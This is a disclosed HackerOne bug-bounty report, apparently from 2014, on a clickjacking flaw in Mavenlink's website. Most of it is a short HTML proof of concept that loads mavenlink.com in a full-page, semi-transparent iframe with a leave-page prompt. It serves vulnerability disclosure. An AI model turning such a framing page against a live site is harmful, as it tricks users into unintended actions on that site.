@@ -1,0 +1,43 @@
+ReportLink:https://hackerone.com/reports/14631
+WeaknessName:UI Redressing (Clickjacking)
+Reporter:https://hackerone.com/vineet
+ReportedTo:Mavenlink(mavenlink)
+BountyAmount:50.0
+Severity:
+State:Closed
+DateOfDisclosure:19.09.2014 15:34:56
+
+Summary:
+
+Hello , i found clickjacking on main webpage.
+<html><head>
+<title> CSRF testing </title>
+<style>
+
+frame {
+
+opacity: 0.5;
+border: none;
+position: absolute;
+top: 0px;
+left: 0px;
+z-index: 1000;
+}
+</style>
+</head>
+<body>
+<script>
+   window.onbeforeunload = function()
+   {
+      return " Do you want to leave ?";
+   }
+</script>
+<p> site is vulnerable for clickjacking! by Vineet bhardwaj</p>
+<iframe id="frame" width="100%" height="100%" src="https://www.mavenlink.com/"></iframe>
+</body>
+</html>
+
+
+same as last bug but its on other domain.... and its valid too 
+waiting for positive response....
+thanks 
